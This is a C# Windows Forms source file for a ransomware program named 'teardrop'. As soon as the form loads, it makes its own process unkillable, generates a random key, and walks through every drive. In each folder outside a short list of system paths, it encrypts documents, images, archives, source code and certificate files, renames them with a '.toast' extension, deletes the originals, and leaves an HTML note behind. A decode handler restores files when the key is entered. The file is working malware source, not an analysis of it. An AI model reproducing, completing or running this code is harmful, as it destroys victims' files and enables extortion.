using System.Reflection;
using System.Runtime.Versioning;

namespace teardrop
{
    public partial class FrmMain : Form
    {
        private static string generatedKey = string.Empty;
        private const string defaultExtension = ".toast";
        private const string defaultMessage = "<h1>Github:</h1><p>´something</p>";
        private enum CypherMode
        {
            Encode,
            Decode
        }

        private readonly string[] skipPaths = new[]
        {
            "WinSxS", "Windows",  "System32", "Program Files",
            "Program Files (x86)", "System Volume Information"
        };

        private readonly string[] allowedExtensions = new[]
        {
            ".jpg", ".jpeg", ".gif", ".mp3", ".m4a", ".wav",
            ".pdf", ".raw", ".bat", ".json", ".doc", ".txt",
            ".png", ".cs", ".c", ".java", ".h", ".rar", ".zip",
            ".7zip", ".doc", ".docx", ".xls", ".xlsx", ".ppt",
            ".pptx", ".odt", ".csv", ".sql", ".mdb", ".sln",
            ".php", ".asp", ".aspx", ".html", ".xml", ".psd",
            ".xhtml", ".odt", ".ods", ".wma", ".wav", ".mpa",
            ".ogg", ".arj", ".deb", ".pkg", ".rar", ".tar.gz",
            ".gz", ".zip", ".py", ".pl", ".bin", ".ai" ,".ico",
            ".asp", ".aspx", ".css", ".js", ".py", ".sh", ".vb",
            "java", ".cpp", ".cert", ".pem"
        };

        public FrmMain()
        {
            InitializeComponent();
        }

        private void Setup()
        {
            GenerateKeys();
            GenerateRandomApplicationName();
            ProcessManager.ProcessUnkillable();
            MachineManager.EnableTaskManager();
        }

        public static void Log(string text, string title)
        {
            try
            {
                if (File.Exists(@".\log.txt"))
                {
                    string prefix = $"[{DateTime.Now}] ";
                    File.AppendAllText(@".\log.txt", $"{prefix}{text}{Environment.NewLine}");
                }
            }
            catch { }
        }


        private void GenerateKeys()
        {
            generatedKey = CryptoManager.GetRandomString(64);
        }

        private void GenerateRandomApplicationName()
        {
            Text = CryptoManager.GetRandomString(64);
        }


        public void WriteLine(string text)
        {
            txtBox.Text += $"{text}{Environment.NewLine}";
        }

        private void ChangeAllFiles(string rootPath, CypherMode mode)
        {
            try
            {
                if ((File.GetAttributes(rootPath) & FileAttributes.ReparsePoint) is not FileAttributes.ReparsePoint)
                {
                    string newFilePath = string.Empty;
                    string defaultKey = generatedKey;

                    foreach (string directory in GetValidDirectories(rootPath))
                    {
                        foreach (string filePath in Directory.GetFiles(Path.GetFullPath(directory)))
                        {
                            string extension = Path.GetExtension(filePath);

                            switch (mode)
                            {
                                case CypherMode.Encode:
                                    if (!IsValidExtension(extension)) break;

                                    newFilePath = FileManager.AddExtension(filePath, defaultExtension);

                                    CryptoManager.EncodeFile(filePath, newFilePath, defaultKey);

                                    WriteLine($@"Encrypted {filePath}");

                                    RemoveFile(filePath);
                                    break;

                                case CypherMode.Decode:
                                    if (!FileManager.HasExtension(filePath, defaultExtension)) break;

                                    newFilePath = FileManager.RemoveExtension(filePath, defaultExtension);

                                    CryptoManager.DecodeFile(filePath, newFilePath, defaultKey);

                                    WriteLine($"Decrypted {filePath}");

                                    RemoveFile(filePath);
                                    break;

                                default: throw new NotSupportedException();
                            }
                        }

                        ChangeAllFiles(directory, mode);
                    }
                }
            }
            catch (Exception e)
            {
                WriteLine(e.Message); Log(e.Message, "ShowAllFolderUnder > General Error");
            }
        }

        private bool IsValidExtension(string extension)
        {
            return allowedExtensions.Contains(extension.ToLower());
        }

        private IEnumerable<string> GetValidDirectories(string path)
        {
            return Directory.GetDirectories(path).Where(directory => !skipPaths.Contains(directory));
        }

        private void RemoveFile(string filePath)
        {
            try
            {
                File.Delete(filePath);
            }
            catch (Exception ex2)
            {
                WriteLine($"Cant delete file {ex2.Message}");
                Log(ex2.Message, "ShowAllFoldersUnder > Delete Error");
            }
        }

        private void ManageDrives(CypherMode mode)
        {
            foreach (DriveInfo drive in DriveInfo.GetDrives())
            {
                ChangeDrive(drive, mode);
            }
        }

        private void ChangeDrive(DriveInfo drive, CypherMode mode)
        {
            WriteLine($@"Found drive {drive.Name}");
            Log($@"Found drive {drive.Name}", "GetFiles > Drive State Check");

            try
            {
                if (!drive.IsReady) throw new AccessViolationException("Drive is not ready.");

                ChangeAllFiles(drive.Name, mode);

                FileManager.WriteHtmlFile(drive.Name, defaultMessage);

            }
            catch (Exception ex)
            {
                Log($@"Found drive {drive.Name} , but it's not ready.", "GetFiles > Drive State Check");
                WriteLine($@"Found drive {drive.Name}, but it's not ready.");
                Log($@"More information about the exception: {ex.Message}", "");
            }
        }

        private void FrmMain_Load(object sender, EventArgs e)
        {
            Setup();
            ManageDrives(CypherMode.Encode);
        }

        private void BtnDecode_Click(object sender, EventArgs e)
        {
            if (string.IsNullOrEmpty(txtKey.Text.Trim())) return;

            generatedKey = txtKey.Text;

            ManageDrives(CypherMode.Decode);
        }
    }
}